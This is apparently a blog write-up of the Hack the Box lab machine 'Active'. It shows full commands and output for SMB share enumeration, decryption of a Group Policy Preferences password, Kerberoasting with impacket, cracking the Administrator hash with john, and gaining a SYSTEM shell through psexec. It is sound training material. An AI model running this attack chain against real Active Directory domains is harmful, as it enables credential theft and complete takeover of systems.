---
layout: post
title: Hack the Box - Active
author: Kolja
categories: [HtB]
tags: [ad]
---

This box was part of the  Active Directory 101 path, which is why I took a look at it.

## Enumeration
As part of the enumeration I looked at the shares:
```
smbmap -H 10.10.10.100                            
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions Comment
        ----                                                    ----------- -------
        ADMIN$                                                  NO ACCESS   Remote Admin
        C$                                                      NO ACCESS   Default share
        IPC$                                                    NO ACCESS   Remote IPC
        NETLOGON                                                NO ACCESS   Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS   Logon server share 
        Users                                                   NO ACCESS
```

There is a `Replication` share, which seems interesting. To download all files we can use:
```
smbclient //10.10.10.100/Replication              
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

There is an encrypted password contained in the files:
```
grep -r pass .                      
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

## Foothold
We can decrypt this password, as the key for this was leaked in the past:
```
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

So we now have credentials: `SVC_TGS/GPPstillStandingStrong2k18`
 
## Privilege Escalation
We can use the credentials to try to get tickets for kerberoastable users using `impacket`:
```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -outputfile hashes
```

There is a ticket for the Administrator user. We can crack this:
```
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:06 DONE (2022-05-24 06:23) 0.1582g/s 1667Kp/s 1667Kc/s 1667KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We now have credentials for the Administrator user and can use `impacket-psexec` to execute commands on the system:
```
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file VNYPCidi.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service zHHQ on 10.10.10.100.....
[*] Starting service zHHQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
